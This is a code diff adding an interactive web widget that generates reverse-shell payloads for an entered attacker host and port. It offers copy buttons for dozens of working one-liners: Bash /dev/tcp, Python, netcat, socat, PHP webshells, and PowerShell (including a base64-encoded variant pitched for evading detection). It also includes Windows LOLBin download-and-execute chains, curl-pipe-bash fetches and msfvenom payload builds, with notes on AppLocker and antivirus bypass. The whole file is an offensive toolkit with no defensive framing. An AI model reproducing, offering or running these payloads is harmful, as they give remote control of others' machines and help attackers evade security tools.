@@ -1,0 +1,275 @@
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --n200:214,219,222;--n300:172,183,188;--n400:129,146,154;
+  --n500:92,107,115;--n600:74,86,92;--n700:56,65,70;
+  --n800:38,44,47;--n900:19,23,24;
+  --p400:204,216,222;--p500:157,180,192;--p600:132,161,176;--p700:107,142,160;
+  --s300:105,225,255;--s400:28,209,255;--s500:0,165,207;--s600:0,132,166;--s800:0,67,85;
+}
+.rs{font-family:monospace;font-size:12px;color:rgb(var(--n200));
+  background:rgb(var(--n900));border:0.5px solid rgb(var(--n700));
+  border-radius:8px;overflow:hidden;margin:1.5rem 0;}
+.rs-top{background:rgb(var(--n800));padding:10px 14px;border-bottom:0.5px solid rgb(var(--n700));
+  display:flex;flex-wrap:wrap;gap:8px;align-items:flex-end;}
+.rs-top label{font-size:10px;color:rgb(var(--p500));text-transform:uppercase;
+  letter-spacing:0.08em;display:block;margin-bottom:3px;}
+.rs-top input{padding:6px 10px;background:rgb(var(--n900));border:0.5px solid rgb(var(--n700));
+  border-radius:4px;color:rgb(var(--n200));font-family:monospace;font-size:12px;}
+.rs-top input:focus{outline:none;border-color:rgb(var(--s500));}
+.rs-gen-btn{padding:7px 18px;border-radius:4px;border:none;background:rgb(var(--s500));
+  color:#fff;font-family:monospace;font-size:12px;cursor:pointer;font-weight:500;align-self:flex-end;}
+.rs-gen-btn:hover{background:rgb(var(--s600));}
+.rs-listener-top{font-size:11px;color:rgb(var(--s300));background:rgb(var(--n900));
+  padding:5px 10px;border-radius:4px;border:0.5px solid rgb(var(--n700));}
+.rs-filter{background:rgb(var(--n800));padding:7px 14px;border-bottom:0.5px solid rgb(var(--n700));
+  display:flex;flex-wrap:wrap;gap:5px;align-items:center;}
+.rs-filter-label{font-size:10px;color:rgb(var(--n500));margin-right:2px;}
+.rs-tag{padding:3px 10px;border-radius:20px;border:0.5px solid rgb(var(--n700));font-size:11px;
+  cursor:pointer;background:transparent;color:rgb(var(--n400));font-family:monospace;}
+.rs-tag:hover{background:rgb(var(--n800));color:rgb(var(--n200));}
+.rs-tag.active{background:rgb(var(--s800));border-color:rgb(var(--s500));color:rgb(var(--s300));}
+.rs-search{padding:4px 8px;background:rgb(var(--n900));border:0.5px solid rgb(var(--n700));
+  border-radius:4px;color:rgb(var(--n200));font-family:monospace;font-size:11px;
+  width:140px;margin-left:auto;}
+.rs-search:focus{outline:none;border-color:rgb(var(--s500));}
+.rs-body{max-height:480px;overflow-y:auto;scrollbar-width:thin;
+  scrollbar-color:rgb(var(--n700)) transparent;}
+.rs-cat-hdr{padding:5px 14px;font-size:10px;font-weight:500;color:rgb(var(--p500));
+  text-transform:uppercase;letter-spacing:0.1em;background:rgb(var(--n800));
+  border-bottom:0.5px solid rgb(var(--n700));position:sticky;top:0;z-index:1;}
+.rs-card{border-bottom:0.5px solid rgb(var(--n800));padding:10px 14px;}
+.rs-card:hover{background:rgb(var(--n800));}
+.rs-card-top{display:flex;align-items:center;gap:6px;margin-bottom:6px;flex-wrap:wrap;}
+.rs-card-name{font-weight:500;font-size:13px;color:rgb(var(--p400));flex:1;}
+.rs-badge{padding:2px 6px;border-radius:3px;font-size:10px;font-weight:500;}
+.rs-badge.linux{background:rgba(0,165,207,0.15);color:rgb(var(--s400));border:0.5px solid rgba(0,165,207,0.3);}
+.rs-badge.windows{background:rgba(157,180,192,0.12);color:rgb(var(--p400));border:0.5px solid rgba(157,180,192,0.25);}
+.rs-badge.both{background:rgba(107,142,160,0.15);color:rgb(var(--p600));border:0.5px solid rgba(107,142,160,0.3);}
+.rs-badge.web{background:rgba(0,100,125,0.2);color:rgb(var(--s300));border:0.5px solid rgba(0,132,166,0.3);}
+.rs-badge.msfvenom{background:rgba(74,86,92,0.3);color:rgb(var(--n300));border:0.5px solid rgb(var(--n600));}
+.rs-badge.stable{background:rgba(0,67,85,0.4);color:rgb(var(--s300));border:0.5px solid rgb(var(--s600));}
+.rs-code{background:rgb(var(--n900));border:0.5px solid rgb(var(--n700));border-radius:4px;
+  padding:8px 10px;font-size:11px;color:rgb(var(--n300));line-height:1.6;
+  white-space:pre-wrap;word-break:break-all;max-height:110px;overflow-y:auto;}
+.rs-listener{background:rgba(0,67,85,0.25);border:0.5px solid rgba(0,132,166,0.3);
+  border-radius:4px;padding:5px 10px;font-size:11px;color:rgb(var(--s300));margin-top:5px;}
+.rs-listener b{color:rgb(var(--s500));}
+.rs-upgrade{background:rgba(0,67,85,0.2);border:0.5px solid rgba(0,100,125,0.4);
+  border-radius:4px;padding:5px 10px;font-size:11px;color:rgb(var(--s400));margin-top:5px;
+  white-space:pre-wrap;}
+.rs-upgrade b{color:rgb(var(--s300));}
+.rs-notes{font-size:10px;color:rgb(var(--n500));margin-top:4px;font-style:italic;}
+.rs-actions{display:flex;gap:5px;margin-top:6px;flex-wrap:wrap;}
+.rs-btn{padding:3px 9px;border-radius:3px;border:0.5px solid rgb(var(--n700));
+  background:transparent;color:rgb(var(--n500));font-size:10px;font-family:monospace;cursor:pointer;}
+.rs-btn:hover{background:rgb(var(--n800));color:rgb(var(--n200));border-color:rgb(var(--n600));}
+.rs-btn.copied{color:rgb(var(--s400));border-color:rgb(var(--s600));}
+.rs-empty{padding:30px;text-align:center;color:rgb(var(--n700));}
+</style>
+
+<div class="rs">
+  <div class="rs-top">
+    <div><label>LHOST</label><input id="rs-lhost" value="10.10.14.1" style="width:150px"></div>
+    <div><label>LPORT</label><input id="rs-lport" value="4444" style="width:70px"></div>
+    <button class="rs-gen-btn" onclick="rsGenerate()">&#x25B6; Generate</button>
+    <div style="margin-left:auto;align-self:flex-end;">
+      <div style="font-size:10px;color:rgb(var(--n500));margin-bottom:3px;">listener</div>
+      <div class="rs-listener-top" id="rs-ltop">nc -lvnp 4444</div>
+    </div>
+  </div>
+  <div class="rs-filter">
+    <span class="rs-filter-label">filter:</span>
+    <button class="rs-tag active" onclick="rsSetTag(this,'all')">all</button>
+    <button class="rs-tag" onclick="rsSetTag(this,'linux')">linux</button>
+    <button class="rs-tag" onclick="rsSetTag(this,'windows')">windows</button>
+    <button class="rs-tag" onclick="rsSetTag(this,'web')">web</button>
+    <button class="rs-tag" onclick="rsSetTag(this,'stable')">★ stable</button>
+    <button class="rs-tag" onclick="rsSetTag(this,'msfvenom')">msfvenom</button>
+    <input class="rs-search" id="rs-search" placeholder="search..." oninput="rsRender()">
+  </div>
+  <div class="rs-body" id="rs-body"></div>
+</div>
+
+<script>
+const RS_SHELLS=[
+  {cat:'Bash',name:'Bash TCP',tags:['linux'],stable:false,
+   code:(h,p)=>`bash -i >& /dev/tcp/${h}/${p} 0>&1`,
+   listener:(p)=>`nc -lvnp ${p}`,
+   upgrade:`python3 -c 'import pty;pty.spawn("/bin/bash")'\nCtrl+Z → stty raw -echo; fg\nreset → export TERM=xterm`,
+   notes:'Most common. May not work in restricted shells.'},
+  {cat:'Bash',name:'Bash TCP fd196',tags:['linux'],stable:false,
+   code:(h,p)=>`0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
+   listener:(p)=>`nc -lvnp ${p}`,notes:'Alternative using fd 196.'},
+  {cat:'Bash',name:'Bash UDP',tags:['linux'],stable:false,
+   code:(h,p)=>`sh -i >& /dev/udp/${h}/${p} 0>&1`,
+   listener:(p)=>`nc -u -lvnp ${p}`,notes:'UDP — useful when TCP is filtered.'},
+  {cat:'Bash',name:'Bash Read Line',tags:['linux'],stable:false,
+   code:(h,p)=>`exec 5<>/dev/tcp/${h}/${p}\ncat <&5 | while read line; do $line 2>&5 >&5; done`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Python',name:'Python3 Simple',tags:['linux','both'],stable:false,
+   code:(h,p)=>`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+   listener:(p)=>`nc -lvnp ${p}`,upgrade:`python3 -c 'import pty;pty.spawn("/bin/bash")'`},
+  {cat:'Python',name:'Python3 PTY (stable)',tags:['linux','stable'],stable:true,
+   code:(h,p)=>`python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
+   listener:(p)=>`nc -lvnp ${p}`,notes:'Spawns proper PTY — tab completion and arrow keys work.'},
+  {cat:'Python',name:'Python2',tags:['linux'],stable:false,
+   code:(h,p)=>`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Python',name:'Python3 IPv6',tags:['linux'],stable:false,
+   code:(h,p)=>`python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+   notes:'For IPv6 targets.'},
+  {cat:'Netcat',name:'Netcat -e',tags:['linux','both'],stable:false,
+   code:(h,p)=>`nc -e /bin/sh ${h} ${p}`,
+   listener:(p)=>`nc -lvnp ${p}`,notes:'Only works if nc compiled with -e.'},
+  {cat:'Netcat',name:'Netcat mkfifo (stable)',tags:['linux','stable'],stable:true,
+   code:(h,p)=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
+   listener:(p)=>`nc -lvnp ${p}`,notes:'Works without -e. Most reliable nc variant.'},
+  {cat:'Netcat',name:'Netcat Windows',tags:['windows'],stable:false,
+   code:(h,p)=>`nc.exe -e cmd.exe ${h} ${p}`,listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Netcat',name:'Netcat BusyBox',tags:['linux'],stable:false,
+   code:(h,p)=>`busybox nc ${h} ${p} -e /bin/sh`,
+   listener:(p)=>`nc -lvnp ${p}`,notes:'Common on IoT/embedded devices.'},
+  {cat:'Socat',name:'Socat Stable TTY',tags:['linux','stable'],stable:true,
+   code:(h,p)=>`socat tcp-connect:${h}:${p} exec:"bash -li",pty,stderr,setsid,sigint,sane`,
+   listener:(p)=>`socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
+   notes:'Best fully interactive shell. Requires socat on both ends.'},
+  {cat:'Socat',name:'Socat Basic',tags:['linux'],stable:false,
+   code:(h,p)=>`socat tcp-connect:${h}:${p} exec:/bin/sh`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Perl',name:'Perl',tags:['linux','both'],stable:false,
+   code:(h,p)=>`perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Perl',name:'Perl No /bin/sh',tags:['linux'],stable:false,
+   code:(h,p)=>`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${h}:${p}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
+   notes:'No /bin/sh dependency.'},
+  {cat:'PHP',name:'PHP fsockopen',tags:['web','linux'],stable:false,
+   code:(h,p)=>`php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'PHP',name:'PHP proc_open',tags:['web'],stable:false,
+   code:(h,p)=>`php -r '$s=fsockopen("${h}",${p});$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);'`,
+   notes:'Works when exec() is disabled.'},
+  {cat:'PHP',name:'PHP Webshell (system)',tags:['web'],stable:false,
+   code:(h,p)=>`<?php system($_GET['cmd']); ?>\n\n# usage:\n?cmd=bash+-i+>&+/dev/tcp/${h}/${p}+0>&1`},
+  {cat:'PHP',name:'PHP Webshell (passthru)',tags:['web'],stable:false,
+   code:(h,p)=>`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd=($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`},
+  {cat:'Ruby',name:'Ruby Spawn',tags:['linux','both'],stable:false,
+   code:(h,p)=>`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("${h}",${p}))'`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Ruby',name:'Ruby No sh',tags:['linux'],stable:false,
+   code:(h,p)=>`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${h}","${p}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue nil}'`},
+  {cat:'PowerShell',name:'PowerShell Basic',tags:['windows'],stable:false,
+   code:(h,p)=>`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object Net.Sockets.TCPClient('${h}',${p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$send=(iex $data 2>&1|Out-String);$send2=$send+'PS '+(pwd).Path+'> ';$b=([text.encoding]::ASCII).GetBytes($send2);$stream.Write($b,0,$b.Length)};$client.Close()"`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'PowerShell',name:'PowerShell Encoded',tags:['windows'],stable:false,
+   code:(h,p)=>{const cmd=`$client=New-Object Net.Sockets.TCPClient('${h}',${p});$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$stream.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$s=(iex $d 2>&1|Out-String);$stream.Write(([text.encoding]::ASCII).GetBytes($s),0,$s.Length)};$client.Close()`;return `powershell -enc ${btoa(cmd)}`;},
+   notes:'Base64 encoded — bypasses basic string detection.'},
+  {cat:'PowerShell',name:'Nishang TCP',tags:['windows','stable'],stable:true,
+   code:(h,p)=>`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${h} -Port ${p}`,
+   notes:'Host locally if no internet on target.'},
+  {cat:'PowerShell',name:'ConPtyShell (stable)',tags:['windows','stable'],stable:true,
+   code:(h,p)=>`IEX(IWR 'https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1' -UseBasicParsing);Invoke-ConPtyShell ${h} ${p}`,
+   listener:(p)=>`stty raw -echo; nc -lvnp ${p}`,
+   notes:'Full interactive Windows shell with ConPTY. Best Windows option.'},
+  {cat:'Windows LOLBins',name:'Certutil Download+Exec',tags:['windows'],stable:false,
+   code:(h,p)=>`certutil -urlcache -split -f http://${h}/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -e cmd.exe ${h} ${p}`,
+   notes:'Download nc.exe via certutil LOLBin.'},
+  {cat:'Windows LOLBins',name:'BitsAdmin',tags:['windows'],stable:false,
+   code:(h,p)=>`bitsadmin /transfer job http://${h}/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe -e cmd.exe ${h} ${p}`},
+  {cat:'Windows LOLBins',name:'MSHTA VBScript',tags:['windows'],stable:false,
+   code:(h,p)=>`mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c nc.exe ${h} ${p} -e cmd.exe"",0,True")`},
+  {cat:'Windows LOLBins',name:'Regsvr32 AppLocker Bypass',tags:['windows'],stable:false,
+   code:(h,p)=>`regsvr32 /s /n /u /i:http://${h}/shell.xml scrobj.dll`,
+   notes:'Host malicious SCT at /shell.xml on your server.'},
+  {cat:'Windows LOLBins',name:'MSBuild',tags:['windows'],stable:false,
+   code:(h,p)=>`# Create shell.csproj, then:\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe shell.csproj`,
+   notes:'Bypasses AppLocker and many AVs.'},
+  {cat:'Java / Go / Node',name:'Java Runtime',tags:['both'],stable:false,
+   code:(h,p)=>`r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${h}/${p};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
+   listener:(p)=>`nc -lvnp ${p}`},
+  {cat:'Java / Go / Node',name:'Go One-liner',tags:['linux','both'],stable:false,
+   code:(h,p)=>`echo 'package main;import(r "os/exec";n "net");func main(){c,_:=n.Dial("tcp","${h}:${p}");cmd:=r.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go`},
+  {cat:'Java / Go / Node',name:'Node.js',tags:['both','web'],stable:false,
+   code:(h,p)=>`node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(${p},"${h}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'`},
+  {cat:'Misc',name:'AWK',tags:['linux'],stable:false,
+   code:(h,p)=>`awk 'BEGIN{s="/inet/tcp/0/${h}/${p}";while(42){do{printf "$ " |& s;s |& getline c;if(c){while((c |& getline)>0)print |& s;close(c)}}while(c!="exit")close(s)}}'`},
+  {cat:'Misc',name:'Lua',tags:['linux'],stable:false,
+   code:(h,p)=>`lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`},
+  {cat:'Misc',name:'Curl Pipe Bash',tags:['linux'],stable:false,
+   code:(h,p)=>`curl http://${h}/shell.sh | bash`,
+   notes:'Host your shell: python3 -m http.server 80'},
+  {cat:'Misc',name:'Wget Pipe Bash',tags:['linux'],stable:false,
+   code:(h,p)=>`wget -q -O- http://${h}/shell.sh | bash`},
+  {cat:'MSFvenom',name:'Linux x64 ELF',tags:['linux','msfvenom'],stable:false,
+   code:(h,p)=>`msfvenom -p linux/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f elf > shell.elf\nchmod +x shell.elf\n\n# listener:\nmsfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ${h}; set LPORT ${p}; run"`},
+  {cat:'MSFvenom',name:'Linux x64 Meterpreter',tags:['linux','msfvenom','stable'],stable:true,
+   code:(h,p)=>`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f elf > meter.elf\nchmod +x meter.elf\n\n# listener:\nmsfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST ${h}; set LPORT ${p}; run"`},
+  {cat:'MSFvenom',name:'Windows x64 EXE',tags:['windows','msfvenom'],stable:false,
+   code:(h,p)=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -f exe > shell.exe`},
+  {cat:'MSFvenom',name:'Windows x64 Meterpreter',tags:['windows','msfvenom','stable'],stable:true,
+   code:(h,p)=>`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f exe > meter.exe\n\n# listener:\nmsfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST ${h}; set LPORT ${p}; run"`},
+  {cat:'MSFvenom',name:'PHP Shell',tags:['web','msfvenom'],stable:false,
+   code:(h,p)=>`msfvenom -p php/reverse_php LHOST=${h} LPORT=${p} -f raw > shell.php`},
+  {cat:'MSFvenom',name:'ASP / ASPX',tags:['windows','web','msfvenom'],stable:false,
+   code:(h,p)=>`# ASP:\nmsfvenom -p windows/shell_reverse_tcp LHOST=${h} LPORT=${p} -f asp > shell.asp\n\n# ASPX:\nmsfvenom -p windows/shell_reverse_tcp LHOST=${h} LPORT=${p} -f aspx > shell.aspx`},
+  {cat:'MSFvenom',name:'WAR (Tomcat)',tags:['web','msfvenom'],stable:false,
+   code:(h,p)=>`msfvenom -p java/shell_reverse_tcp LHOST=${h} LPORT=${p} -f war > shell.war\n\n# deploy via Tomcat manager /manager/html`},
+  {cat:'MSFvenom',name:'Python Payload',tags:['linux','msfvenom'],stable:false,
+   code:(h,p)=>`msfvenom -p cmd/unix/reverse_python LHOST=${h} LPORT=${p} -f raw > shell.py\npython3 shell.py`},
+  {cat:'MSFvenom',name:'Encoded (shikata_ga_nai)',tags:['windows','msfvenom'],stable:false,
+   code:(h,p)=>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=${h} LPORT=${p} -e x64/xor_dynamic -i 5 -f exe > enc_shell.exe`,
+   notes:'Basic AV evasion. Use custom loaders for better results.'},
+];
+
+let rsActiveTag='all';
+function rsSetTag(el,t){document.querySelectorAll('.rs-tag').forEach(x=>x.classList.remove('active'));el.classList.add('active');rsActiveTag=t;rsRender();}
+function rsGenerate(){document.getElementById('rs-ltop').textContent=`nc -lvnp ${document.getElementById('rs-lport').value}`;rsRender();}
+function rsEsc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+
+function rsRender(){
+  const h=document.getElementById('rs-lhost').value||'10.10.14.1';
+  const p=document.getElementById('rs-lport').value||'4444';
+  const q=document.getElementById('rs-search').value.toLowerCase();
+  const body=document.getElementById('rs-body');body.innerHTML='';
+  const filtered=RS_SHELLS.filter(s=>{
+    const tm=rsActiveTag==='all'||s.tags.includes(rsActiveTag)||(rsActiveTag==='stable'&&s.stable);
+    const sm=!q||s.name.toLowerCase().includes(q)||s.cat.toLowerCase().includes(q)||(s.notes&&s.notes.toLowerCase().includes(q));
+    return tm&&sm;
+  });
+  if(!filtered.length){body.innerHTML='<div class="rs-empty">no results</div>';return;}
+  const byCat={};filtered.forEach(s=>{(byCat[s.cat]=byCat[s.cat]||[]).push(s);});
+  Object.entries(byCat).forEach(([cat,shells])=>{
+    const ch=document.createElement('div');ch.className='rs-cat-hdr';ch.textContent=cat;body.appendChild(ch);
+    shells.forEach((s,i)=>{
+      const code=s.code(h,p);
+      const listener=s.listener?s.listener(p):`nc -lvnp ${p}`;
+      const uid=`rs-${cat}-${i}`.replace(/\W/g,'-');
+      const badges=s.tags.map(t=>`<span class="rs-badge ${t}">${t}</span>`).join('');
+      const stb=s.stable?'<span class="rs-badge stable">★ stable</span>':'';
+      const upg=s.upgrade?`<div class="rs-upgrade"><b>upgrade shell:</b>\n${rsEsc(s.upgrade)}</div>`:'';
+      const notes=s.notes?`<div class="rs-notes">${s.notes}</div>`:'';
+      const card=document.createElement('div');card.className='rs-card';
+      card.innerHTML=`<div class="rs-card-top"><span class="rs-card-name">${s.name}</span>${badges}${stb}</div>
+<div class="rs-code" id="${uid}">${rsEsc(code)}</div>
+<div class="rs-listener"><b>listener:</b> ${rsEsc(listener)}</div>
+${upg}${notes}
+<div class="rs-actions">
+  <button class="rs-btn" onclick="rsCp('${uid}',this,'copy payload')">copy payload</button>
+  <button class="rs-btn" onclick="rsCpTxt(${JSON.stringify(listener)},this)">copy listener</button>
+</div>`;
+      body.appendChild(card);
+    });
+  });
+}
+
+function rsCp(id,btn,def){
+  navigator.clipboard.writeText(document.getElementById(id).textContent);
+  btn.textContent='copied!';btn.classList.add('copied');
+  setTimeout(()=>{btn.textContent=def;btn.classList.remove('copied');},1500);
+}
+function rsCpTxt(txt,btn){
+  navigator.clipboard.writeText(txt);btn.textContent='copied!';btn.classList.add('copied');
+  setTimeout(()=>{btn.textContent='copy listener';btn.classList.remove('copied');},1500);
+}
+rsRender();
+</script>
